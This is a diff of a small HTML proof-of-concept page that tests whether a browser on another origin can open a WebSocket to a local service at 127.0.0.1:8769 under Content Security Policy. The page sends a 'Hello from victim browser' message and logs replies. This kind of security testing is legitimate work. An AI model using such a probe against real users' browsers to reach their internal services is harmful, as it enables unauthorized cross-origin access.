@@ -1,14 +1,25 @@
 <!DOCTYPE html>
 <html>
-  <label>PoC Test</label>
+<head>
+  <title>WebSocket CSP Probe</title>
+</head>
+<body>
+  <h1>Testing WebSocket CSP</h1>
   <script>
     const ws = new WebSocket("ws://127.0.0.1:8769");
+
     ws.onopen = () => {
-      console.log("Connected to internal WebSocket!");
-      ws.send("Hello from external origin!");
+      console.log("[+] WebSocket connection successful");
+      ws.send("Hello from victim browser");
     };
-    ws.onmessage = (msg) => {
-      console.log("Message from internal service:", msg.data);
+
+    ws.onmessage = (event) => {
+      console.log("[+] Message from server:", event.data);
+    };
+
+    ws.onerror = (err) => {
+      console.error("[-] WebSocket error:", err);
     };
   </script>
+</body>
 </html>
